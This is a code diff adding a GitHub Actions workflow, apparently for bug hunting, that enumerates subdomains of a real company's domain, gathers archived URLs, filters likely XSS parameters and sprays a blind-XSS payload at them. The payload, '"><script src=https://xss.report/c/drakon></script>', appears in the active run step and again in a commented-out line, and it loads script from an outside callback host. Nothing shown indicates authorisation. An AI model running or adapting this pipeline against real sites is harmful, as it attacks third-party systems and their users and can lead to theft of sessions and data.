@@ -1,0 +1,64 @@
+name: XSS Recon Pipeline
+
+on:
+  workflow_dispatch:
+
+jobs:
+  scan:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Install Chromium
+        run: sudo apt install -y chromium
+      - name: Setup Go & Dependencies
+        run: |
+          sudo apt update
+          sudo apt install -y golang
+          pip3 install uro
+          echo "$(go env GOPATH)/bin" >> $GITHUB_PATH
+          go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
+          go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
+          go install -v github.com/projectdiscovery/katana/cmd/katana@latest
+          go install github.com/lc/gau/v2/cmd/gau@latest
+          go install -v github.com/tomnomnom/gf@latest
+          go install -v github.com/ethicalhackingplayground/bxss/v2/cmd/bxss@latest
+          
+
+      - name: Install GF Patterns
+        run: |
+          source $GITHUB_ENV
+          mkdir -p ~/.gf
+          git clone https://github.com/1ndianl33t/Gf-Patterns
+          mv Gf-Patterns/*.json ~/.gf/
+
+      - name: Run XSS Pipeline
+        run: |
+          source $GITHUB_ENV
+          subfinder -d bentley.com -all -recursive -silent | tee subs.txt
+
+          # Step 2: Probe live hosts
+          cat subs.txt | httpx -silent -follow-redirects | tee alive.txt
+          
+          cat alive.txt | gau --subs | tee gau_urls.txt
+
+          cat gau_urls.txt | uro | tee clean_urls.txt
+
+          cat clean_urls.txt | gf xss | tee xss_candidates.txt
+
+          cat xss_candidates.txt | bxss -t -p '"><script src=https://xss.report/c/drakon></script>' | tee bxss_output.txt
+
+          # Step 3: Crawl for URLs
+          #cat alive.txt | katana -u - -f qurl -d 2 | tee urls.txt
+
+          # Step 4: Filter XSS candidate URLs
+          #cat urls.txt | gf xss | tee xss_candidates.txt
+
+          # Step 5: Blind XSS scan
+          #cat xss_candidates.txt | bxss -t -p '"><script src=https://xss.report/c/drakon></script>' | tee bxss_output.txt
+
+          echo "Pipeline completed."
+
+
+      - name: Show BXSS Output
+        if: always()
+        run: cat bxss_output.txt
